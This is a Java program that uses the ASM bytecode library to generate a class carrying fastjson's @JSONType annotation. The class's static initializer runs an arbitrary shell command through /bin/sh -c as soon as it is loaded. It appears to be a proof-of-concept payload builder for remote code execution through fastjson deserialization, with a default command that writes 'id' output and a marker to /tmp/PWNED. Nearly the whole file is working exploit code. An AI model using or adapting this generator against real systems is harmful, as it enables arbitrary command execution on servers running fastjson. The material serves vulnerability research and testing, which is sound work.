import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

import java.nio.file.Files;
import java.nio.file.Paths;

public class Gen {
    public static void main(String[] args) throws Exception {
        String internalName = args[0];
        String out = args[1];
        String cmd = args.length > 2 ? args[2]
                : "id >> /tmp/PWNED 2>&1; echo RCE_via_fastjson_JSONType >> /tmp/PWNED";

        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC | Opcodes.ACC_SUPER,
                internalName, null, "java/lang/Object", null);
        cw.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true).visitEnd();

        MethodVisitor c = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        c.visitCode();
        c.visitVarInsn(Opcodes.ALOAD, 0);
        c.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        c.visitInsn(Opcodes.RETURN);
        c.visitMaxs(1, 1);
        c.visitEnd();

        MethodVisitor m = cw.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
        m.visitCode();
        m.visitTypeInsn(Opcodes.NEW, "java/io/File");
        m.visitInsn(Opcodes.DUP);
        m.visitLdcInsn("/tmp/PWNED");
        m.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/io/File", "<init>", "(Ljava/lang/String;)V", false);
        m.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/File", "createNewFile", "()Z", false);
        m.visitInsn(Opcodes.POP);
        m.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
        m.visitInsn(Opcodes.ICONST_3);
        m.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");
        m.visitInsn(Opcodes.DUP); m.visitInsn(Opcodes.ICONST_0); m.visitLdcInsn("/bin/sh"); m.visitInsn(Opcodes.AASTORE);
        m.visitInsn(Opcodes.DUP); m.visitInsn(Opcodes.ICONST_1); m.visitLdcInsn("-c"); m.visitInsn(Opcodes.AASTORE);
        m.visitInsn(Opcodes.DUP); m.visitInsn(Opcodes.ICONST_2); m.visitLdcInsn(cmd); m.visitInsn(Opcodes.AASTORE);
        m.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
        m.visitInsn(Opcodes.POP);
        m.visitInsn(Opcodes.RETURN);
        m.visitMaxs(0, 0);
        m.visitEnd();

        cw.visitEnd();

        Files.write(Paths.get(out), cw.toByteArray());
        System.out.println("[gen] wrote class bytes " + out + " internalName=" + internalName);
    }
}
